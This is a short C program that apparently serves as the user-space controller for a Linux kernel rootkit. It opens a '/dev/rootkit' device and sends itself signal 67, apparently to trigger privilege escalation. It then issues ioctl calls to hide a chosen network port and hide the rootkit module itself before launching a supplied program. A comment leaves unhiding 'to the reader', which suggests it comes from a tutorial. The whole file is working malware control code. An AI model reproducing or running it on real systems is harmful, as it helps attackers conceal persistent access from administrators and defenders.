#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>

#define HIDE_PORT _IOW('a', 23, int *)
#define HIDE_MOD _IO('a', 24)

int main(int argc, char *argv[])
{
	int fd = -1;
	int d_port = atoi(argv[1]);

	printf("PID: %d, UID: %d\n", getpid(), getuid());

	fd = open("/dev/rootkit", O_RDONLY);

	if (fd < 0)
	{
		printf("Failed to open driver :(\n");
		return 1;
	}

	kill(getpid(), 67);

	ioctl(fd, HIDE_PORT, &d_port);

	ioctl(fd, HIDE_MOD, 0);

    // Left up to reader - implement unhiding

	close(fd);

	execve(argv[2], (argv + 2), NULL);
}